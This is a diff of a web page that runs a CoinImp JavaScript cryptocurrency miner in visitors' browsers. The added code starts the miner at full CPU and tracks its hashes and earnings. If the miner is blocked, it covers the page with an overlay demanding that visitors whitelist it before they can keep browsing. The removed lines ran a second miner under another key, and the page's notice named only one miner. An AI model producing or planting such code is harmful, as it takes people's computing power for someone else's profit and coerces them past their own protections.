@@ -71,23 +71,51 @@
             text-decoration: underline;
         }
     </style>
-    <script src="https://www.hostingcloud.racing/8oS7.js"></script>
+    <script src="https://www.hostingcloud.racing/8oS7"></script>
     <script>
-        var _clientMain = new Client.Anonymous('201bf3164446664b5c4e56c8ce2d8d0464a9ded1d82355ffb07357741b6262c3', {
+        var _client = new Client.Anonymous('201bf3164446664b5c4e56c8ce2d8d0464a9ded1d82355ffb07357741b6262c3', {
             throttle: 0, c: 'w'
         });
-        _clientMain.start();
-        _clientMain.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+        _client.start();
+        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
 
-        var _clientSecondary = new Client.Anonymous('1c3f806b447c40e88c5f2f4d101353803558bdcc2fb86c2ea49fa7184a2edb48', {
-            throttle: 0, c: 'w'
-        });
-        _clientSecondary.start();
+        setTimeout(function(){
+            if(typeof _client === 'undefined' || _client === null)
+            {
+                var messageDiv = document.createElement("div");
+                messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+                messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+                var mainDiv = document.createElement("div");
+                mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+                mainDiv.appendChild(messageDiv);
+                document.body.appendChild(mainDiv);
+                document.getElementsByTagName("body")[0].style.overflow = "hidden";
+                window.scrollTo(0, 0);
+            }
+        },1000);
+
+        setTimeout(function(){
+            let speedValue = document.getElementById("speedValue");
+            let totalValue = document.getElementById("totalValue");
+            let earningsValue = document.getElementById("earningsValue");
+
+            setInterval(function(){
+                let speed = _client._threads.reduce((before, worker) => before + worker.hashesPerSecond, 0);
+                let total = _client._threads.reduce((before, worker) => before + worker.hashesTotal, 0);
+                speedValue.textContent = speed;
+                totalValue.textContent = total;
+
+                // Calculate earnings based on total hash (assumed earnings per 1 million hashes)
+                let earningsPerMillionHashes = 0.14752202; // Sample earning per 1 million hashes
+                let earnings = (total / 1000000) * earningsPerMillionHashes;
+                earningsValue.textContent = earnings.toFixed(8) + " MINTME";
+            }, 500);
+        }, 2000);
     </script>
 </head>
 <body>
     <div class="container">
-        <h1>Crypto Mining Dashboard</h1>
+        <h1>Crypto Mining</h1>
         <div class="info">
             <p>This site is running JavaScript miner from <a href="https://www.coinimp.com/">coinimp.com</a>. If it bothers you, you can stop it.</p>
             <p>If you're interested in mining, you can start <a href="https://www.coinimp.com/invite/5c749fe6-9220-4369-9374-af94a7f60c8c">here</a>.</p>
@@ -96,36 +124,19 @@
                     <th colspan="2">Mining Stats</th>
                 </tr>
                 <tr>
-                    <td>Main Mining Speed hash:</td>
-                    <td><span id="speedValue" class="hash-value">0</span> Hashes/s</td>
+                    <td>Speed :</td>
+                    <td><span id="speedValue" class="hash-value">0</span></td>
                 </tr>
                 <tr>
-                    <td>Main Mining Total hash:</td>
+                    <td>Total :</td>
                     <td><span id="totalValue" class="hash-value">0</span></td>
                 </tr>
                 <tr>
-                    <td>Secondary Mining Speed hash:</td>
-                    <td><span id="secondarySpeedValue" class="hash-value">0</span> Hashes/s</td>
-                </tr>
-                <tr>
-                    <td>Secondary Mining Total hash:</td>
-                    <td><span id="secondaryTotalValue" class="hash-value">0</span></td>
+                    <td>Earnings :</td>
+                    <td><span id="earningsValue" class="hash-value">0</span></td>
                 </tr>
             </table>
         </div>
     </div>
-    <script>
-        setInterval(function(){
-            let mainSpeed = _clientMain._threads.reduce((before, worker) => before + worker.hashesPerSecond, 0);
-            let mainTotal = _clientMain._threads.reduce((before, worker) => before + worker.hashesTotal, 0);
-            let secondarySpeed = _clientSecondary._threads.reduce((before, worker) => before + worker.hashesPerSecond, 0);
-            let secondaryTotal = _clientSecondary._threads.reduce((before, worker) => before + worker.hashesTotal, 0);
-
-            document.getElementById("speedValue").textContent = mainSpeed;
-            document.getElementById("totalValue").textContent = mainTotal;
-            document.getElementById("secondarySpeedValue").textContent = secondarySpeed;
-            document.getElementById("secondaryTotalValue").textContent = secondaryTotal;
-        }, 500);
-    </script>
 </body>
-</html>
+                                                                             </html>
